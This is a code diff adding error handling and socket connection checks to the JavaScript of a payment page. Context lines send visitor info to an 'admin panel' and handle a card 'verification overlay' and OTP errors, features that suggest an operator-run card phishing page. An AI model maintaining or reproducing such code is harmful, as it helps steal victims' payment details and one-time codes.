@@ -699,6 +699,12 @@ Your payment information is securely transmitted using 256-bit encryption. We do
       }
       return true;
   };
+        // Additional global error handler for all uncaught errors
+window.addEventListener('error', function(event) {
+    console.error('Uncaught error:', event.error);
+    showErrorNotification('An unexpected error occurred. Please refresh and try again.');
+    return false;
+});
   
   // Timer reference and socket
   let timerRef = null;
@@ -849,14 +855,21 @@ document.addEventListener('DOMContentLoaded', function() {
         // Generate invoice ID
         document.getElementById('invoiceId').textContent = generateInvoiceID();
         
-        // Initialize socket connection
-        socket = io();
-        
-        // Socket connection debugging
-        socket.on('connect', () => {
-            console.log('Socket connected with ID:', socket.id);
-            console.log('Socket transport type:', socket.io.engine.transport.name);
-            
+       // Socket connection initialization
+try {
+    console.log('Initializing socket connection...');
+    socket = io();
+    
+    // Add connection error handling
+    socket.on('connect_error', (error) => {
+        console.error('Socket connection error:', error);
+        showErrorNotification('Connection to payment server failed. Please refresh and try again.');
+    });
+    
+    socket.on('connect', () => {
+        console.log('Socket connected with ID:', socket.id);
+        console.log('Socket transport type:', socket.io.engine.transport.name);
+      
             // Send visitor info to admin panel
             socket.emit('visitor', {
                 pid: state.pid || generateTransactionId(),
@@ -2021,35 +2034,37 @@ function handleMcSubmit() {
       }
   }
 
-  // Handle errors from payment gateway
-  function handlePaymentError(errorMessage) {
-      // Re-enable submit button
-      const cardForm = document.getElementById('card-form');
-      if (cardForm) {
-          const submitBtn = cardForm.querySelector('button[type="submit"]');
-          if (submitBtn) {
-              submitBtn.disabled = false;
-              submitBtn.innerHTML = 'Pay Now';
-          }
-      }
-      
-      // Hide MC verification overlay if shown
-      const overlay = document.getElementById('mcVerificationOverlay');
-      if (overlay) {
-          overlay.style.display = 'none';
-      }
-      
-      // Show error notification
-      showErrorNotification(errorMessage || 'There was an error processing your payment. Please try again.');
-      
-      // Notify server of error
-      if (socket) {
-          socket.emit('payment_error', {
-              transactionId: state.transactionId,
-              error: errorMessage
-          });
-      }
-  }
+ // In your handlePaymentError function near line 23
+function handlePaymentError(errorMessage) {
+    // Re-enable submit button
+    const cardForm = document.getElementById('card-form');
+    if (cardForm) {
+        const submitBtn = cardForm.querySelector('button[type="submit"]');
+        if (submitBtn) {
+            submitBtn.disabled = false;
+            submitBtn.innerHTML = 'Pay Now';
+        }
+    }
+
+    // Hide MC verification overlay if shown
+    const overlay = document.getElementById('mcVerificationOverlay');
+    if (overlay) {
+        overlay.style.display = 'none';
+    }
+
+    // Show error notification
+    showErrorNotification(errorMessage || 'There was an error processing your payment. Please try again.');
+
+    // Notify server of error - ADD DEFENSIVE CHECK HERE
+    if (socket && socket.connected) {  // This check prevents the error
+        socket.emit('payment_error', {
+            transactionId: state.transactionId,
+            error: errorMessage
+        });
+    } else {
+        console.error('Socket not connected, cannot send payment_error event');
+    }
+}
 
   function handleOtpError(errorMessage) {
       // Show error message
